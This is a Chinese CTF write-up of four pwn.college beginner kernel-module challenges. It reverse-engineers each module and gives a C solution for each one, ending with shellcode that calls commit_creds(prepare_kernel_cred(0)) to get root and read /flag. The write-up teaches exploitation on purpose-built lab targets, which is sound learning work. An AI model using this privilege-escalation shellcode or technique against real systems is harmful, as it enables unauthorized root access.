浅析一下几道不算 kernel pwn 的 babykernel 题

题目来自：https://cse466.pwn.college/



## level1_teaching1.ko

IDA 打开可以看到

![image-20210222001452809](https://gitee.com/scriptkiddies/images/raw/master/image-20210222001452809.png)

看看初始化函数 `init_module`

```c
int __cdecl init_module()
{
  __int64 v0; // rbp

  v0 = filp_open("/flag", 0LL, 0LL);
  memset(flag, 0, sizeof(flag));
  kernel_read(v0, flag, 128LL, v0 + 104);
  filp_close(v0, 0LL);
  proc_entry = (proc_dir_entry *)proc_create("pwncollege", 438LL, 0LL, &fops);
  printk(&unk_950);
  printk(&unk_758);
  printk(&unk_950);
  printk(&unk_780);
  printk(&unk_7E8);
  printk(&unk_848);
  printk(&unk_898);
  printk(&unk_956);
  return 0;
}
```

其实就是

把 `flag` 文件读入 `flag` 变量

使用 `proc_create` 创建虚拟 `proc` 文件 `pwncollege`，这个文件会出现在 `/proc/pwncollege`

然后打印 `banaer`



既然是文件看看对应的文件操作函数

`device_open` 对应 `open` 文件时触发的函数

`device_write` 对应 `write` 文件时触发的函数

`device_read` 对应 `read` 文件时触发的函数



### device_open

```c
int __fastcall device_open(inode *inode, file *file)
{
  printk(&unk_6B0);
  return 0;
}
```

unk_6B0： `[device_open] inode=%px, file=%px`

 打印 `pwncollege` 文件的 `inode` 和 `file` 结构的地址





### device_write

```c
ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // r12

  v4 = length;
  printk(&unk_6D8);
  device_state[0] = (strncmp(buffer, "xmaguhfipptqlmvc", 0x10uLL) == 0) + 1;
  return v4;
}
```

可以看到，对 `/proc/pwncollege` 进行写入操作时会判断输入的东西是不是 `xmaguhfipptqlmvc`

如果输入的东西前 `16` 字节是 `xmaguhfipptqlmvc`，则  `device_state[0] = 2`，因为 `(strncmp(buffer, "xmaguhfipptqlmvc", 0x10uLL) == 0)` 结果为真，运算结果等于 `1`

 

### device_read

```c
ssize_t __fastcall device_read(file *file, char *buffer, size_t length, loff_t *offset)
{
  char *v4; // r12
  size_t v5; // rbp
  const char *v6; // rsi
  signed __int64 v7; // rdx
  unsigned __int64 v8; // rax

  v4 = buffer;
  v5 = length;
  printk(&unk_718);
  v6 = flag;
   // 判断 device_state[0]，如果不等于 2 则不能通过检查（陷入这个 if 就说明失败）
  if ( device_state[0] != 2 )
  {
    v6 = "device error: unknown state\n";
    if ( device_state[0] <= 2 )
    {
      v6 = "password:\n";
      if ( device_state[0] )
      {
        v6 = "device error: unknown state\n";
        if ( device_state[0] == 1 )
        {
          device_state[0] = 0;
          v6 = "invalid password\n";
        }
      }
    }
  }
  v7 = v5; // v5 是读取的长度
  v8 = strlen(v6) + 1; // v8 存的是 buffer 的长度
  if ( v8 - 1 <= v5 ) // 如果 buffer 可容纳的数据长度小于要读取得数据的长度
    v7 = v8 - 1; // 只是把 buffer 填满
  return v8 - 1 - copy_to_user(v4, v6, v7); // 把 flag 拷贝到位于用户态 buffer
}
```



### 思路

其实看完就很明确了，目标就是让 `device_state[0] == 2`

只要用 `write` 往  `/proc/pwncollege` 文件写入 `xmaguhfipptqlmvc` ，然后再使用 `read` 去读，就能读出 `flag`

payload:

```c
#include <stdio.h>
#include <fcntl.h>

int main() {
  char buffer[100];
  int fd = open("/proc/pwncollege", O_RDWR);
  char key[] = "xmaguhfipptqlmvc";
  write(fd, key, sizeof(key));
  read(fd, buffer, 100);
  printf("%s\n", buffer);
  close(fd);
  return 0;
}
```



## level2_teaching1.ko

IDA 打开

![image-20210222005529729](https://gitee.com/scriptkiddies/images/raw/master/image-20210222005529729.png)

这下没有 `device_write` 函数了，该怎么交互

用 `ioctl`

直接看

### device_read 

```c
ssize_t __fastcall device_read(file *file, char *buffer, size_t length, loff_t *offset)
{
  char *v4; // r12
  size_t v5; // rbp
  const char *v6; // rsi
  signed __int64 v7; // rdx
  unsigned __int64 v8; // rax

  v4 = buffer;
  v5 = length;
  printk(&unk_4C8, file, buffer);
  v6 = flag;
  if ( device_state[0] != 2 )
  {
    v6 = "device error: unknown state\n";
    if ( device_state[0] <= 2 )
    {
      v6 = "password:\n";
      if ( device_state[0] )
      {
        v6 = "device error: unknown state\n";
        if ( device_state[0] == 1 )
        {
          device_state[0] = 0;
          v6 = "invalid password\n";
        }
      }
    }
  }
  v7 = v5;
  v8 = strlen(v6) + 1;
  if ( v8 - 1 <= v5 )
    v7 = v8 - 1;
  return v8 - 1 - copy_to_user(v4, v6, v7);
}
```



其实逻辑跟 `level1_teaching1.ko` 的 `device_read` 是一样的，也是检查 `device_state[0]` 是不是等于 `2`，等于 `2` 就给 `flag`



### device_ioctl

其实除了使用 `read` 和 `write` 和内核模块交互还有就是 `ioctl`

看一看 man 手册：https://man7.org/linux/man-pages/man2/ioctl.2.html

```c
__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  const char *v3; // rbp
  __int64 result; // rax

  v3 = (const char *)arg;
  printk(&unk_498, file, cmd);
  result = -1LL;
  if ( cmd == 1337 ) // 如果 cmd 参数等于 1337
  {
    if ( !strncmp(v3, "fxdlbyszlixwsnjt", 0x10uLL) ) // 并且 arg 等于 fxdlbyszlixwsnjt 的话 
      device_state[0] = 2; // 标识可以拿到 flag
    else
      device_state[0] = 1;
    result = 0LL;
  }
  return result;
}
```

ioctl 函数

```
       #include <sys/ioctl.h>

       int ioctl(int fd, unsigned long request, ...);
```

先用 `open` 打开文件得到文件描述符

调用 `ioctl` 时 `fd` 就是对应文件的 文件描述符

`request` 就是操作的操作码

接下来就是可变参数，因为每个设备的 `ioctl` 是自己实现的，所以可以使用任意参数，在这里就是一个字符串指针，指向 `fxdlbyszlixwsnjt` 字符串

### 思路

好了，直接 写 payload

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int main() {
  char buffer[100];
  int fd = open("/proc/pwncollege", O_RDWR);
  char key[] = "fxdlbyszlixwsnjt";
  ioctl(fd, 1337, key);
  read(fd, buffer, 100);
  printf("%s\n", buffer);
  close(fd);
  return 0;
}
```



## level3_teaching1.ko

![image-20210222011125023](https://gitee.com/scriptkiddies/images/raw/master/image-20210222011125023.png)



这个挑战去掉了 `device_read`，多了一个 `win` 函数

其实 `win` 就是个后门函数

### win

```c
void __cdecl win()
{
  printk(&unk_BCF, flag);
}
```

成功调用 `win` 函数就能拿到 `flag`



### device_ioctl

```c
__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  __int64 result; // rax

  printk(&unk_980, file);
  result = -1LL;
  if ( cmd == 1337 )
  {
    _x86_indirect_thunk_rbx(&unk_980);
    result = 0LL;
  }
  return result;
}
```

可以看到 操作码为 `1337` 会调用 `_x86_indirect_thunk_rbx` 函数，这个是 `kernel` 里面的一个函数

```c
#define DECL_INDIRECT_THUNK(reg) \
	extern asmlinkage void __x86_indirect_thunk_ ## reg (void);
SYM_FUNC_START(__x86_indirect_thunk_\reg)
	JMP_NOSPEC \reg
SYM_FUNC_END(__x86_indirect_thunk_\reg
```

其实展开其实差不多就是 

```c
void __x86_indirect_thunk_rbx (void) {
	__asm__("jmp rbx");
}
```

想要了解细节自己去搜索 `retpline` 

好了，扯远了

`_x86_indirect_thunk_rbx(&unk_980)` 可以看成 `jmp rbx`

看汇编

```asm
ext.unlikely:00000000000008EC ; __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
.text.unlikely:00000000000008EC device_ioctl    proc near               ; DATA XREF: .data:fops↓o
.text.unlikely:00000000000008EC file = rdi                              ; file *
.text.unlikely:00000000000008EC cmd = rsi                               ; unsigned int
.text.unlikely:00000000000008EC arg = rdx                               ; unsigned __int64
.text.unlikely:00000000000008EC                 push    rbp
.text.unlikely:00000000000008ED                 mov     rcx, arg
.text.unlikely:00000000000008F0                 mov     ebp, esi
.text.unlikely:00000000000008F2 cmd = rbp                               ; unsigned int
.text.unlikely:00000000000008F2                 push    rbx
.text.unlikely:00000000000008F3                 mov     rbx, arg
.text.unlikely:00000000000008F6 arg = rbx                               ; unsigned __int64
.text.unlikely:00000000000008F6                 mov     edx, esi
.text.unlikely:00000000000008F8                 mov     rsi, file
.text.unlikely:00000000000008FB                 mov     file, offset unk_980
.text.unlikely:0000000000000902                 call    printk          ; PIC mode
.text.unlikely:0000000000000907                 or      rax, 0FFFFFFFFFFFFFFFFh
.text.unlikely:000000000000090B                 cmp     ebp, 539h
.text.unlikely:0000000000000911                 jnz     short loc_91A
.text.unlikely:0000000000000913                 call    __x86_indirect_thunk_rbx ; PIC mode
.text.unlikely:0000000000000918                 xor     eax, eax
.text.unlikely:000000000000091A
.text.unlikely:000000000000091A loc_91A:                                ; CODE XREF: device_ioctl+25↑j
.text.unlikely:000000000000091A                 pop     arg
.text.unlikely:000000000000091B                 pop     cmd
.text.unlikely:000000000000091C                 retn
.text.unlikely:000000000000091C device_ioctl    endp
```

可以看到 `0x00000000000008F2` 其实 `rbx` 就是指向 `arg`，执行到 `call    __x86_indirect_thunk_rbx` 时相当于 `jmp rbx`

```asm
gef➤  disassemble __x86_indirect_thunk_rbx
Dump of assembler code for function __x86_indirect_thunk_rbx:
   0xffffffff81e00ef0 <+0>:	jmp    rbx
   0xffffffff81e00ef2 <+2>:	nop
   0xffffffff81e00ef3 <+3>:	nop
   0xffffffff81e00ef4 <+4>:	nop
   0xffffffff81e00ef5 <+5>:	nop
   0xffffffff81e00ef6 <+6>:	nop
   0xffffffff81e00ef7 <+7>:	nop
   0xffffffff81e00ef8 <+8>:	nop
   0xffffffff81e00ef9 <+9>:	nop
   0xffffffff81e00efa <+10>:	nop
   0xffffffff81e00efb <+11>:	nop
   0xffffffff81e00efc <+12>:	nop
   0xffffffff81e00efd <+13>:	nop
   0xffffffff81e00efe <+14>:	nop
   0xffffffff81e00eff <+15>:	nop
   0xffffffff81e00f00 <+16>:	nop
```

如果我们输入一个地址，那么执行时就是 `jmp` 到这个地址

现在我们就是要获取 `win` 函数的地址，在这里没有 `kaslr`，可以直接读取 `/proc/kallsyms` 获得 `win` 函数的地址

插入内核模块后，可以通过

```
/proc/kallsyms | grep win
```

得到 `win` 函数的地址 `0xffffffffc000091d` 

写 `payload`

```c
#include <sys/ioctl.h>
#include <stdio.h>
#include <fcntl.h>

int main ()
{
  int fd = open ("/proc/pwncollege", O_RDONLY);
  ioctl (fd, 1337, 0xffffffffc000091d);
  char flag[200];
  read (fd, flag, 200);
  printf ("%s\n", flag);
  close (fd);
  return 0;
}
```





## level4_teaching1.ko

![image-20210222014150865](https://gitee.com/scriptkiddies/images/raw/master/image-20210222014150865.png)

这个模块只能使用 `write` 输入数据，没有可以读取 `flag` 的函数，也没有后门函数，咋办？

### device_write

```c
ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rbx
  signed __int64 v5; // rdx
  unsigned __int8 *v6; // rdi
  __int64 v7; // rbp

  v4 = length;
  printk(&unk_408);
  v5 = 4096LL;
  if ( v4 <= 4096 )
    v5 = v4;
  v6 = shellcode;
  v7 = copy_from_user(shellcode, buffer, v5);
  _x86_indirect_thunk_rax(v6);
  return v4 - v7;
}
```

其实看反编译不太明了，看汇编

```asm
.text.unlikely:000000000000035C ; ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
.text.unlikely:000000000000035C device_write    proc near               ; DATA XREF: .data:fops↓o
.text.unlikely:000000000000035C file = rdi                              ; file *
.text.unlikely:000000000000035C buffer = rsi                            ; const char *
.text.unlikely:000000000000035C length = rdx                            ; size_t
.text.unlikely:000000000000035C offset = rcx                            ; loff_t *
.text.unlikely:000000000000035C                 push    rbp
.text.unlikely:000000000000035D                 mov     r8, offset
.text.unlikely:0000000000000360                 mov     rbp, buffer
.text.unlikely:0000000000000363 buffer = rbp                            ; const char *
.text.unlikely:0000000000000363                 mov     offset, length
.text.unlikely:0000000000000366                 push    rbx
.text.unlikely:0000000000000367                 mov     rbx, length
.text.unlikely:000000000000036A length = rbx                            ; size_t
.text.unlikely:000000000000036A                 mov     rdx, rsi
.text.unlikely:000000000000036D                 mov     rsi, file
.text.unlikely:0000000000000370                 mov     file, offset unk_408
.text.unlikely:0000000000000377                 call    printk          ; PIC mode
.text.unlikely:000000000000037C                 cmp     length, 1000h
.text.unlikely:0000000000000383                 mov     edx, 1000h
.text.unlikely:0000000000000388                 mov     rsi, buffer # 这里会用 _copy_from_user 把我们输入的东西放进 shellcode
.text.unlikely:000000000000038B                 cmovbe  rdx, length
.text.unlikely:000000000000038F                 mov     rdi, cs:shellcode
.text.unlikely:0000000000000396                 call    _copy_from_user ; PIC mode
.text.unlikely:000000000000039B                 mov     buffer, rax
.text.unlikely:000000000000039E                 mov     rax, cs:shellcode # 可以看到最终 rax 指向 shellcode
.text.unlikely:00000000000003A5                 call    __x86_indirect_thunk_rax ; PIC mode #jmp rax
.text.unlikely:00000000000003AA                 mov     rax, length
.text.unlikely:00000000000003AD                 pop     length
.text.unlikely:00000000000003AE length = rax                            ; size_t
.text.unlikely:00000000000003AE                 sub     length, rbp
.text.unlikely:00000000000003B1                 pop     rbp
.text.unlikely:00000000000003B2
.text.unlikely:00000000000003B2 locret_3B2:                             ; DATA XREF: .orc_unwind_ip:00000000000006D1↓o
.text.unlikely:00000000000003B2                                         ; .orc_unwind_ip:00000000000006D5↓o ...
.text.unlikely:00000000000003B2                 retn
.text.unlikely:00000000000003B2 device_write    endp
```

### 思路

这个挑战能输入，不能输出，我们要读取 `/flag` 文件得到 `flag`，但是我们只是普通权限，我们只能提权，怎么提权？

其实在内核里面有有个 `cred` 结构描述进程的权限 

`current->cred;`

```c
/*
 * The security context of a task
 *
 * The parts of the context break down into two categories:
 *
 *  (1) The objective context of a task.  These parts are used when some other
 *	task is attempting to affect this one.
 *
 *  (2) The subjective context.  These details are used when the task is acting
 *	upon another object, be that a file, a task, a key or whatever.
 *
 * Note that some members of this structure belong to both categories - the
 * LSM security pointer for instance.
 *
 * A task has two security pointers.  task->real_cred points to the objective
 * context that defines that task's actual details.  The objective part of this
 * context is used whenever that task is acted upon.
 *
 * task->cred points to the subjective context that defines the details of how
 * that task is going to act upon another object.  This may be overridden
 * temporarily to point to another security context, but normally points to the
 * same context as task->real_cred.
 */
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
  // 就是下面这几个了 uid gid 什么的，root 的 uid 和 gid 是 0
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;

struct task_struct {
  .......
  /* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
  .......
}
```



需要用到内核里面的两个函数

`prepare_kernel_cred` 和 `commit_creds`

`prepare_kernel_cred`  函数能帮我们构造一个 `cred`

`commit_creds` 修改当前进程的 `cred`

浅析一下这两个函数

`prepare_kernel_cred`

```c
/**
 * prepare_kernel_cred - Prepare a set of credentials for a kernel service
 * @daemon: A userspace daemon to be used as a reference
 *
 * Prepare a set of credentials for a kernel service.  This can then be used to
 * override a task's own credentials so that work can be done on behalf of that
 * task that requires a different subjective context.
 *
 * @daemon is used to provide a base for the security record, but can be NULL.
 * If @daemon is supplied, then the security data will be derived from that;
 * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
 *
 * The caller may change these controls afterwards if desired.
 *
 * Returns the new credentials or NULL if out of memory.
 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
  .......
	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);
  .......
  validate_creds(old);

	*new = *old;
  .......
  
  put_cred(old);
	validate_creds(new);
	return new
}

```

这里可以看到的是 如果 参数 `daemon` 为 `0` ，则使用 `init` 进程的 `cred` 用作复制的模板，`init` 进程的 `cred`，`root！！！`

```
#define GLOBAL_ROOT_UID KUIDT_INIT(0)
#define GLOBAL_ROOT_GID KGIDT_INIT(0)
```

```c
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
	.securebits		= SECUREBITS_DEFAULT,
	.cap_inheritable	= CAP_EMPTY_SET,
	.cap_permitted		= CAP_FULL_SET,
	.cap_effective		= CAP_FULL_SET,
	.cap_bset		= CAP_FULL_SET,
	.user			= INIT_USER,
	.user_ns		= &init_user_ns,
	.group_info		= &init_groups,
};
```

所以我们只要 `prepare_kernel_cred (0)` 就能得到一个 `root` 的 `cred`



commit_creds

```c
/**
 * commit_creds - Install new credentials upon the current task
 * @new: The credentials to be assigned
 *
 * Install a new set of credentials to the current task, using RCU to replace
 * the old set.  Both the objective and the subjective credentials pointers are
 * updated.  This function may not be called if the subjective credentials are
 * in an overridden state.
 *
 * This function eats the caller's reference to the new credentials.
 *
 * Always returns 0 thus allowing this function to be tail-called at the end
 * of, say, sys_setgid().
 */
int commit_creds(struct cred *new)
{
	struct task_struct *task = current; // task 指向当前进程的 task_struct 结构
	const struct cred *old = task->real_cred;
  
  ......

	validate_creds(old);
	validate_creds(new);
  
  ......

	get_cred(new); /* we will require a ref for the subj creds too */
  ......
	/* do it
	 * RLIMIT_NPROC limits on user->processes have already been checked
	 * in set_user().
	 */
	alter_cred_subscribers(new, 2);
	if (new->user != old->user)
		atomic_inc(&new->user->processes);
	rcu_assign_pointer(task->real_cred, new); // 修改 task 的 real_cred 为 new cred
	rcu_assign_pointer(task->cred, new); // 修改 task 的 cred 为 new cred
  
  ......
	/* release the old obj and subj refs both */
	put_cred(old);
	put_cred(old);
	return 0;
}
EXPORT_SYMBOL(commit_creds);
```

好了，现在思路明了了，其实我们就是要调用 `prepare_kernel_cred` 得到一个 `root` 的 `cred`，然后使用 commit_creds 修改当前进程的 cred，让当前进程拥有 root 权限

```
commit_creds(prepare_kernel_cred (0));
```

怎么写？

还是一样，在这里没有 `kaslr`，可以直接读取 `/proc/kallsyms` 获取函数的地址

插入内核模块后，可以通过

```
cat /proc/kallsyms | grep prepare_kernel_cred
cat /proc/kallsyms | grep commit_creds
```

![image-20210222024057729](https://gitee.com/scriptkiddies/images/raw/master/image-20210222024057729.png)

`prepare_kernel_cred` 函数的地址 `0xffffffff810881c0`

`commit_creds` 函数的地址 `0xffffffff81087e80`

写 `payload`

```asm
push rsi;
mov rsi, 0xffffffff810881c0;
push rdi;
xor rdi, rdi;
call rsi;
mov rdi, rax;
mov rsi, 0xffffffff81087e80;
call rsi;
pop rdi;
pop rsi;
ret;
```

我用 `rasm2` 编译成字节码

![image-20210222022249066](https://gitee.com/scriptkiddies/images/raw/master/image-20210222022249066.png)

`-a x86` x86架构

`-b 64` 64位cpu

`-C` 输出为 c 语言格式

`-f` 从文件读取

得到 `shellcode`

```c
"\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xff\xff\xd6\x48\x89\xc7" \
"\x48\xbe\x80\x7e\x08\x81\xff\xff\xff\xff\xff\xd6\x5f\x5e\xc3"
```

payload：

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>

char shellcode[] = {
  "\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xff\xff\xd6\x48\x89\xc7" \
  "\x48\xbe\x80\x7e\x08\x81\xff\xff\xff\xff\xff\xd6\x5f\x5e\xc3"
};
int main() {
  printf("%s\n", shellcode);
  int fd = open("/proc/pwncollege", O_WRONLY);
  printf("%d\n", fd);
  write(fd, shellcode, 50);
  system("id");
  system("cat /flag");
  return 0;
}
```



![image-20210222152556474](https://gitee.com/scriptkiddies/images/raw/master/image-20210222152556474.png)

